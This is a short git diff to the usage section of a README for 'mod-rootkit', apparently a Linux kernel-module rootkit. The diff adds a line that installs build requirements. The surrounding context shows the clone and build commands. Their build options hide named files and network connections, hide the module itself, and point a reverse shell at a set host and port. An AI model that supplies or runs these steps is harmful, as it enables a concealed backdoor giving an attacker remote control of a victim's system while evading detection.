@@ -50,6 +50,8 @@ Tested on x86_64 Linux only
 
 # Usage
 ```bash
+sudo apt install -y build-essential linux-headers-$(uname -r) # install requirements
+
 git clone https://github.com/flashnuke/mod-rootkit.git
 cd mod-rootkit
 make STRING_EXCLUDES="SOME_FILENAME1,SOME_FILENAME2" NET_EXCLUDES="127.0.0.1,2222" RSHELL_HOST=192.168.1.1 RSHELL_PORT=9001 HIDE_MODULE=0
